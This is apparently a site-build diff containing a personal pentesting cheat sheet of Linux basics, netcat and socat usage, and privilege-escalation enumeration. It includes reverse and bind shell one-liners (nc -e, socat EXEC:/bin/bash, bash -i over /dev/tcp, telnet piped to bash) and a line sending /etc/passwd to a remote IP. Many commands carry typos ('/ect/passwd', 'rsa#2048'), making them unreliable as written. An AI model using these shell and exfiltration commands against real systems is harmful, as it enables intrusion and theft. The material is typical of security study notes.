@@ -1,0 +1,114 @@
+I"�%<h2 id="linux-enumerate">Linux enumerate</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man <span class="c"># manual of programs</span>
+<span class="nb">pwd</span> <span class="c"># Actula path.</span>
+<span class="nb">mkdir</span> <span class="c">#  Create directories</span>
+<span class="nb">ls</span> <span class="c"># List file</span>
+- <span class="nb">ls</span> <span class="nt">-l</span> <span class="c"># Show permissions, users and group, lenght and date</span>
+- <span class="nb">ls</span> <span class="nt">-a</span> <span class="c"># List hide files</span>
+- <span class="nb">ls</span> <span class="nt">-la</span> <span class="c"># List hide and permisions</span>
+<span class="nb">touch</span> <span class="c"># Create a file</span>
+<span class="nb">echo</span> <span class="c"># Write in screen</span>
+- <span class="nb">echo </span>exampletext <span class="o">&gt;</span> file <span class="c"># Save in a file</span>
+<span class="nb">cat</span> <span class="c"># Read the file</span>
+<span class="nb">cp</span> <span class="c"># Do a copy</span>
+<span class="nb">mv </span>file file1 <span class="c"># Move/rename the file</span>
+<span class="nb">head</span> <span class="c"># Read the first 5 lines</span>
+<span class="nb">tail</span> <span class="nt">-f</span> arquivoexemplo <span class="c"># Show in real time the end of file</span>
+<span class="c">## Users</span>
+/ect/passwd <span class="c"># Users list file</span>
+adduser nome <span class="c"># Create user</span>
+deluser nome <span class="c"># delete user</span>
+adduser nome <span class="nb">sudo</span> <span class="c"># Change permission to sudo </span>
+<span class="nb">cat</span> /var/log/auth.log <span class="c"># log of authentications </span>
+</code></pre></div></div>
+
+<h3 id="networks">Networks</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig <span class="c"># Network informations</span>
+service serviceexample restart <span class="c"># restart a service</span>
+netstat <span class="c"># Network open ports and configurations</span>
+traceroute <span class="c"># Trace the packages using TTL(Time to live).</span>
+hping3# MOst <span class="nb">complete </span>ping, can use SYN, port, etc.
+host# Identify DNS.
+netcat <span class="c"># Interacte and communicate with others services</span>
+- nc 10.0.0.0 443 
+- nc vlp port <span class="c"># Open the port and listenin</span>
+- nc <span class="nt">-vnlup</span> port <span class="c"># Open udp port</span>
+- nc <span class="nt">-vnu</span> ip <span class="c"># Connection UDP</span>
+- nc <span class="nt">-v</span> ip port &lt; file <span class="c"># Send a file.</span>
+- nc <span class="nt">-vnlp</span> port <span class="o">&gt;</span> file <span class="c"># Receive a file.</span>
+- Portscan
+    - nc <span class="nt">-vnz</span> ip port <span class="c"># Ports and show the service. (z - scan)</span>
+    - nc <span class="nt">-vnz</span> ip port-port 
+    - <span class="k">for </span>porta <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>filetextports<span class="si">)</span><span class="p">;</span><span class="k">do </span>nc <span class="nt">-vnz</span> ip <span class="nv">$porta</span><span class="p">;</span><span class="k">done</span> <span class="c"># Sacn in a range</span>
+- honeypot
+    - <span class="k">while </span><span class="nb">true</span><span class="p">;</span><span class="k">do </span>nc <span class="nt">-vnlp</span> 21 &lt; 21.txt <span class="o">&gt;&gt;</span> 21.log 2&gt;&gt; 21.log<span class="p">;</span><span class="k">done</span> <span class="c"># SHow a false banner, capture and save the commands and errors</span>
+Reverse shell 
+- nc <span class="nt">-vnlp</span> port <span class="c"># </span>
+- nc.exe vn ip port <span class="nt">-e</span> cmd.exe 
+Bind shell
+- nc <span class="nt">-vnlp</span> port <span class="nt">-e</span> /bin/bash 
+- nc.exe <span class="nt">-vn</span> ip port <span class="c"># Victim - Open the port and receive shell</span>
+<span class="nt">-ncat</span> <span class="c"># Use cryptography</span>
+- openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa#2048 <span class="nt">-keyout</span> chave.pem <span class="nt">-out</span> cert.pem <span class="nt">-days</span> 10 <span class="c"># Create a key to comunicate</span>
+- ncat <span class="nt">-vnlp</span> 8443 —ssl-key chave.pem —ssl-cert cert.pem <span class="c"># Open the ssl port</span>
+- ncat <span class="nt">-vn</span> 192.168.0.200 8443 —ssl <span class="c"># Victim</span>
+- ncat <span class="nt">-vnlp</span> 8443 —ssl-key chave.pem —ssl-cert cert.pem —allow 192.168.0.26 <span class="c"># Attack</span>
+Socat
+- socat - tcp4-listen#2222 <span class="c"># Open port</span>
+- socat - tcp4:19.168.0.200:4040 <span class="c"># Connect to ip port</span>
+- socat - tcp4:19.168.0.200:4040 EXEC:/bin/bash <span class="c"># Send bash</span>
+Telnet
+- telnet google.com 21 <span class="c">#  Connect to port</span>
+- telnet 172.20.1.74 4444 | /bin/bash | telnet 172.20.1.73 4445 <span class="c"># Shell reverse, send bash to 4444, and bash output to 4445</span>
+/dev/tcp
+- <span class="nb">echo</span> <span class="s2">"teste"</span> <span class="o">&gt;</span> /dev/tcp/192.168.0.4/4545 <span class="c"># Open a tcp socket</span>
+- <span class="nb">cat</span> /etc/passwd <span class="o">&gt;</span> /dev/tcp/192.168.0.4/4545 
+- <span class="o">&gt;</span>/dev/tcp/192.168.0.4/4545 <span class="c"># Connect to a machine</span>
+- bash <span class="nt">-i</span> <span class="o">&gt;</span>/dev/tcp/192.168.0.4/4545 0&gt;&amp;1 2&gt;&amp;1 <span class="c"># Send a bash to attackin machine/Reverse shell</span>
+Tor <span class="c"># service start tor</span>
+- proxychains# /etc/proxychains.conf
+    - socks5 127.0.0.1 9050
+    - dynamic_chain
+    - Navegador <span class="c"># Manual proxy 127.0.0.1 9050, check proxy dns</span>
+</code></pre></div></div>
+<h3 id="services">Services</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>update-rc.d service <span class="nb">enable</span> <span class="c"># Save a service to boot  </span>
+</code></pre></div></div>
+
+<h3 id="localizar--output">Localizar / Output</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate fileexample <span class="c"># Locate a file</span>
+updatedb <span class="c"># Update locate database</span>
+whereis programexample <span class="c"># Locate programs</span>
+which programexample <span class="c"># Locate binaries</span>
+<span class="nb">grep</span> <span class="s2">"bin/bash"</span> /etc/passwd <span class="c"># Search by a specifi line</span>
+<span class="nb">grep</span> <span class="s2">"bin/bash"</span> /etc/passw <span class="o">&gt;</span> exemple 
+<span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"nologin"</span> /etc/passw <span class="c"># Exclude the specific lines</span>
+egrep <span class="nt">-v</span> <span class="s2">"nologin | /bin/false"</span> /etc/passw 
+<span class="nb">awk</span> <span class="nt">-F</span> <span class="c"># '{print $1,$3}' /etc/passwd # Show based in a filter</span>
+<span class="nb">cut</span> <span class="nt">-d</span> <span class="nt">-f1</span>,f2 <span class="c"># Cut and show a specific</span>
+<span class="nb">sed</span> <span class="s1">'s/wrong/right'</span> filelocal <span class="c"># Replace ocurrencies in a file</span>
+<span class="nb">sort</span> <span class="c"># Adjust the ouitput</span>
+<span class="nb">uniq</span> <span class="c"># Delete all repeated occurencies(do sort before)</span>
+- <span class="nb">uniq</span> <span class="nt">-c</span> <span class="c"># Count lines</span>
+<span class="nb">wc</span> <span class="c"># Count</span>
+</code></pre></div></div>
+
+<h3 id="privilege-escalation-commands">Privilege escalation commands</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- <span class="nb">wc</span> <span class="nt">-l</span> <span class="c"># Count the lines</span>
+- <span class="nb">cat</span>  /etc/passwd <span class="c"># Users</span>
+- <span class="nb">hostname</span> <span class="c"># Mchine name</span>
+- <span class="nb">uname</span> <span class="nt">-a</span> <span class="c"># Kernel version x86/x64</span>
+- <span class="nb">cat</span> /etc/issue <span class="c"># SO version</span>
+- <span class="nb">cat</span> /etc/<span class="k">*</span><span class="nt">-release</span> <span class="c"># More complete SO informations</span>
+- dpkg <span class="nt">-l</span> <span class="c"># List programs and verions</span>
+- ifconfig <span class="nt">-a</span> <span class="c"># Network and adpters</span>
+- route <span class="c"># Route table and gateway</span>
+- netstat <span class="nt">-nlpt</span> <span class="c"># Open ports</span>
+- netstat <span class="nt">-nlpu</span> <span class="c"># UDP open ports</span>
+- ps <span class="nt">-aux</span> <span class="c"># Show running proccess</span>
+- <span class="nb">cat</span> /etc/crontab <span class="c"># Show as scripts and commands schedule</span>
+- find / <span class="nt">-writable</span> <span class="nt">-type</span> d 2&gt;/dev/null <span class="c"># Show directories with write permission</span>
+- find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null <span class="c"># Show programs that are executable </span>
+- <span class="nb">sudo</span> <span class="nt">-l</span> <span class="c"># With sudo permissions</span>
+</code></pre></div></div>
+:ET
